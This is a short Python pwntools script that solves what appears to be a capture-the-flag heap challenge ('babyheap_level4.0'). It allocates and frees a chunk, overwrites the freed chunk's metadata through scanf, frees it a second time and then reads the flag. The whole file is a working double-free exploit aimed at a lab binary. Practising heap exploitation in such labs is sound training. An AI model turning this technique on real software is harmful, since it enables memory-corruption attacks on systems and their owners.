from pwn import *

with process("/challenge/babyheap_level4.0") as p:
    p.sendline(b"malloc")
    p.sendline(b"854")

    p.sendline(b"free")

    p.sendline(b"scanf")
    p.sendline(b"A" * 8 + b"B" * 4)

    p.sendline(b"free")

    p.sendline(b"read_flag")

    p.sendline(b"puts")

    print(p.clean())
